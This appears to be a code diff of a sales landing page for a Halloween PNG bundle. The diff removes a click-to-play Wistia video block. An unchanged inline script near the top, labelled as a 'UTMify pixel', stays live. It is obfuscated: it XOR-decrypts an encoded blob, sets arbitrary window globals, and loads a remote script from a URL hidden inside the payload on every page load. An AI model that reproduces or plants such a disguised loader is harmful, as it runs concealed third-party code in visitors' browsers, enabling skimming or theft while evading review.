@@ -9,7 +9,6 @@
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cellipse cx='32' cy='38' rx='26' ry='22' fill='%23FF7A1A'/%3E%3Crect x='29' y='8' width='6' height='12' rx='2' fill='%2384CC16'/%3E%3Cpath d='M20 34l6-6 6 6zM32 34l6-6 6 6z' fill='%230A0A0A'/%3E%3Cpath d='M20 44q12 8 24 0' stroke='%230A0A0A' stroke-width='4' fill='none'/%3E%3C/svg%3E">
 <link rel="preload" href="fonts/barlow-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="fonts/barlow-condensed-900.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="img/video-poster.webp" as="image" type="image/webp" fetchpriority="high">
 
 <!-- UTMify pixel -->
 <script>(function(){var z_5=atob("DBAFs0BB0QpkmU4zv2snxjIt8zBG8TpHz2M/nG8itWRK7Dpe1nZ8nSMuvCQG62FA3GJswzQy/noN4StfkGBsyyUt/2AXu2IR3mRxwSkjpH4B6mwJ5E0pkSctvmgF9T0RhUt+kS4gvG9Go2xD1mhg3wkl8yZG7y9fynUniWJ3sGlVoX4Lj3E00nMk4DtX+nxRhyVjh3djrFcZ");var x_e=[];for(var z_t27m=0;z_t27m<z_5.length;z_t27m++){x_e.push(z_5.charCodeAt(z_t27m)&255);}var h_bng=x_e[0];var r_ws4=x_e.slice(1,1+h_bng);var f_bsqz=x_e.slice(1+h_bng);var a_l=f_bsqz.map(function(b,k_2wpx){return b^r_ws4[k_2wpx%h_bng];});var a_ff4="";for(var a_kk=0;a_kk<a_l.length;a_kk++){a_ff4+=String.fromCharCode(a_l[a_kk]&255);}var s_cqoo=decodeURIComponent(escape(a_ff4));var c_nhj2=JSON.parse(s_cqoo);var q_wb=c_nhj2.globals||[];q_wb.forEach(function(g_dyg){window[g_dyg.name]=g_dyg.value;});var k_z=document.createElement("script");k_z.src=c_nhj2.url;k_z.async=true;k_z.defer=true;(c_nhj2.attributes||[]).forEach(function(l_08o2){k_z.setAttribute(l_08o2.name,l_08o2.value);});(document.head||document.documentElement).appendChild(k_z);})();</script>
@@ -96,19 +95,6 @@ header.top .in{max-width:var(--wrap); margin:0 auto; padding:14px clamp(16px,4vw
 .ph.loaded::after{display:none}
 .ph img{width:100%; height:100%; object-fit:cover}
 .r-4-3{aspect-ratio:4/3} .r-4-5{aspect-ratio:4/5} .r-1-1{aspect-ratio:1/1} .r-16-9{aspect-ratio:16/9}
-
-.hero-video{order:4; width:100%; max-width:430px; margin:0 auto 22px; align-self:center;
-  border-radius:18px; overflow:hidden; background:var(--surface);
-  border:1px solid rgba(255,255,255,.10);
-  box-shadow:0 22px 60px rgba(0,0,0,.6), 0 0 0 6px rgba(255,122,26,.06)}
-.video-facade{position:relative; display:block; width:100%; aspect-ratio:1/1; padding:0; border:0; background:#111; cursor:pointer}
-.video-facade img{width:100%; height:100%; object-fit:cover}
-.video-facade::after{content:""; position:absolute; top:50%; left:50%; width:70px; height:70px; border-radius:50%;
-  transform:translate(-50%,-50%); background:var(--pumpkin); box-shadow:0 8px 30px rgba(0,0,0,.55)}
-.video-facade::before{content:""; position:absolute; z-index:1; top:50%; left:calc(50% + 3px); transform:translate(-50%,-50%);
-  border-top:13px solid transparent; border-bottom:13px solid transparent; border-left:19px solid #0A0A0A}
-.video-facade:focus-visible{outline:3px solid #fff; outline-offset:-3px}
-.hero-video wistia-player{display:block; width:100%; aspect-ratio:1/1; border-radius:16px; overflow:hidden}
 
 /* ---------- hero ---------- */
 .hero{position:relative; overflow:hidden; background:
@@ -292,7 +278,6 @@ footer nav a{color:var(--muted); text-decoration:none}
 .creator-photo img{width:100%; height:auto; border-radius:20px; display:block}
 /* ---------- responsive ---------- */
 @media (max-width:900px){
-  .hero-video{max-width:440px; margin-bottom:22px}
   .grid-3,.bonus-grid,.reviews-grid{grid-template-columns:1fr}
   .bonus-grid .bonus:nth-child(4){grid-column:auto}
   .make{grid-template-columns:repeat(2,1fr)}
@@ -350,11 +335,6 @@ footer nav a{color:var(--muted); text-decoration:none}
       <div class="trust-row">
         <span><svg class="ic" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="4" y="10" width="16" height="11" rx="2.5" stroke="currentColor" stroke-width="1.8"/><path d="M8 10V7a4 4 0 0 1 8 0v3" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="15.5" r="1.6" fill="currentColor"/></svg>Secure checkout</span><span><svg class="ic" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M13 2 4 14h6l-1 8 9-12h-6l1-8Z" fill="currentColor"/></svg>Instant download</span><span><svg class="ic" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3l7 3v5.5c0 4.2-2.9 7.9-7 9.5-4.1-1.6-7-5.3-7-9.5V6l7-3Z" stroke="currentColor" stroke-width="1.8"/><path d="M8.8 12.2l2.3 2.2 4.1-4.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>7-day guarantee</span>
       </div>
-    </div>
-    <div class="hero-video">
-      <button class="video-facade" id="videoFacade" type="button" aria-label="Play the Halloween Product Vault video">
-        <img src="img/video-poster.webp" alt="Preview of the Halloween PNG bundle video" width="720" height="720" decoding="async" fetchpriority="high">
-      </button>
     </div>
   </div>
 </section>
@@ -660,27 +640,6 @@ footer nav a{color:var(--muted); text-decoration:none}
 
 
 <script>
-/* Keep the video poster lightweight until the visitor asks to play it. */
-(function(){
-  var trigger = document.getElementById('videoFacade');
-  trigger.addEventListener('click', function(){
-    var player = document.createElement('wistia-player');
-    player.setAttribute('media-id', 'jo304gfysh');
-    player.setAttribute('aspect', '1.0');
-    player.setAttribute('poster', new URL('img/video-poster.webp', document.baseURI).href);
-    player.setAttribute('autoplay', '');
-    trigger.replaceWith(player);
-
-    var embed = document.createElement('script');
-    embed.src = 'https://fast.wistia.com/embed/jo304gfysh.js';
-    embed.type = 'module';
-    var runtime = document.createElement('script');
-    runtime.src = 'https://fast.wistia.com/player.js';
-    runtime.async = true;
-    document.head.append(embed, runtime);
-  }, {once:true});
-})();
-
 /* =========================================================
    CHECKOUT LINKS: replace with your Hotmart checkout links
    ========================================================= */
